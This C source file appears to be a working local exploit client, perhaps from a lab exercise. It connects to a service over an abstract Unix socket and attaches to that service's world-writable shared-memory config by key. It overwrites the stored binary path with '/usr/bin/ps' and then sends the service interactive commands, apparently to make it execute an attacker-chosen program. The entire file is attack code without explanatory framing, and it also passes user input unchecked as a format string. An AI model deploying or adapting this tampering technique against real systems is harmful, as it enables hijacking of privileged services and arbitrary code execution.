#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stddef.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <stdint.h>
#include <stdlib.h>

#define BUF_SIZE 1024
#define RECV_BUF_SIZE 4096
#define CMD_SIZE 1024
#define USERNAME_SIZE 50
#define PASSWORD_SIZE 30
#define DATA_PATH_SIZE 260
#define CONF_SIZE sizeof(struct config)

typedef enum
{
    login,
    stop,
    execute
} CMD;

struct config
{
    char username[USERNAME_SIZE];
    char password[PASSWORD_SIZE];
    char data_path[DATA_PATH_SIZE];
    size_t data_path_file_size;
    CMD cmd;
};

void render_ascii(uint8_t *data, ssize_t len)
{
    char c[2] = {0};
    uint8_t *idx = (uint8_t *)data;
    for (int i = 0; i < len; i++)
    {
        sprintf(c, "%c", idx[i]);
        if (c[0] < 32 || c[0] > 126)
        {
            printf(".");
        }
        else
        {
            printf("%s", c);
        }
    }
}

void hexdump(void *data, ssize_t len)
{
    uint8_t *idx = (uint8_t *)data;
    printf("       0  1  2  3  4  5  6  7    8  9  a  b  c  d  e  f\n");

    printf("0000  %02x ", idx[0]);
    for (int i = 1; i < len; i++)
    {
        if (((i % 8) == 0) && ((i % 16) != 0))
        {
            printf("| %02x ", idx[i]);
            continue;
        }
        if ((i % 16) == 0)
        {
            printf(" ");
            render_ascii(&idx[i - 16], 16);

            printf("\n%04x  %02x ", i, idx[i]);
            continue;
        }

        printf("%02x ", idx[i]);
    }
    printf("\n");
}

/**
 * To map the config we just need the key.
 */
int map_config(struct config **conf, key_t key)
{
    int shmid = 0;

    shmid = shmget(key, CONF_SIZE, 0666);
    if (-1 == shmid)
    {
        perror("shmget failed");
        return -1;
    }

    *conf = (struct config *)shmat(shmid, (void *)0, 0);
    printf("Shared memory address: %p\n", *conf);
    printf("Key: %x\n", key);
    if ((void *)-1 == *conf)
    {
        perror("shmat failed");
        return -1;
    }

    return 0;
}

int modify_mem(int _key, const char *binpath)
{
    // Get the key to the memory segment
    key_t key = _key;
    struct config *conf = NULL;

    // Map in the config
    if (-1 == map_config(&conf, key) || NULL == conf)
    {
        return -1;
    }

    // View the memory segment before we modify it
    hexdump(conf, CONF_SIZE);

    // Clear out the path that is there
    memset(conf->data_path, 0, DATA_PATH_SIZE);
    strncpy(conf->data_path, binpath, strlen(binpath) + 1);

    // View the memory segment after we modify it
    hexdump(conf, CONF_SIZE);

    return 0;
}

/**
 * @brief - A helper message to send a string across a socket
 */
int send_msg(int client, const char *msg_fmt, ...)
{
    char msg[RECV_BUF_SIZE] = {0};

    va_list args;
    va_start(args, msg_fmt);
    vsnprintf(msg, RECV_BUF_SIZE - 1, msg_fmt, args);
    va_end(args);

    int msg_len = strlen(msg) + 1;
    int bytes_left = msg_len;
    int bytes_sent = 0;

    while (1)
    {
        bytes_sent = send(client, &msg_len, sizeof(msg_len), 0);
        if (-1 == bytes_sent)
        {
            perror("send");
            return bytes_sent;
        }

        bytes_sent = send(client, msg, msg_len, 0);
        if (-1 == bytes_sent)
        {
            perror("send");
            return bytes_sent;
        }

        bytes_left -= bytes_sent;
        if (bytes_left == 0)
        {
            return bytes_left;
        }
    }
}

int main(int argc, char**argv)
{
    int sock = 0;
    int ret = 0;
    struct sockaddr_un addr = { 0 };
    struct sockaddr_un client_addr = { 0 };
    char buf [BUF_SIZE] = { 0 };

    // Make sure that an argument is passed in
    if (argc != 4)
    {
        printf("Usage: %s <abstract socket> <client socket name> <shared memory key>\n", argv[0]);
        return 0;
    }

    // Create the socket that will be listening for the proper connection
    sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (-1 == sock)
    {
        perror("socket");
        return 0;
    }

    // Make sure the socket is zero'd out
    memset(&addr, 0, sizeof(struct sockaddr_un));

    // Specify the address of the socket
    addr.sun_family = AF_UNIX;
    client_addr.sun_family = AF_UNIX;

    // Need to copy the passed in name and we make sure to leave the first
    // byte a null since it is an abstract socket
    memcpy(&addr.sun_path[1], argv[1],  strlen(argv[1]));
    memcpy(client_addr.sun_path, argv[2],  strlen(argv[2]));

    ret = bind(sock, (const struct sockaddr*)&client_addr, sizeof(struct sockaddr_un));
    if (-1 == ret)
    {
        // If bind fails it's probably because we already created a socket
        // bound to a specific file. Be sure to clean that up so we can reuse
        // the address
        unlink(client_addr.sun_path);
        ret = bind(sock, (const struct sockaddr*)&client_addr, sizeof(struct sockaddr_un));
        if (-1 == ret)
        {
            perror("bind");

            close(sock);
            return 0;
        }
    }

    // The size needs to be the the sizeof(sun_family) + the length of the
    // abstract name. The length of the abstract name is just the length of the
    // string passed in plus the null byte that is on the front
    ret = connect(sock,
                  (const struct sockaddr*)&addr,
                  offsetof(struct sockaddr_un, sun_path) + 1 + strlen(argv[1]));
    if (-1 == ret)
    {
        perror("connect");
        close(sock);
        return 0;
    }

    // If we connected successfully then go ahead and make the memory modifications
    if (-1 == modify_mem(atoi(argv[3]), "/usr/bin/ps"))
    {
        printf("Failed to modify memory\n");
        return 0;
    }

    char cmd[CMD_SIZE] = {0};
    while (1)
    {
        memset(cmd, 0, CMD_SIZE);
        memset(buf, 0, BUF_SIZE);
        // Receive some data from the sending socket
        ret = recv(sock, buf, BUF_SIZE, 0); 
        if (-1 == ret)
        {
            perror("recv");
            close(sock);
            return 0;
        }

        if (0 == ret)
        {
            printf("Your connection was terminated\n");
            close(sock);
            return 0;
        }

        printf("%s\n", buf);
        fgets(cmd, CMD_SIZE, stdin);
        send_msg(sock, cmd);
        if (strncmp(cmd, "stop", 4) == 0)
        {
            close(sock);
            return 0;
        }
    }
    close(sock);
    return 0;
}
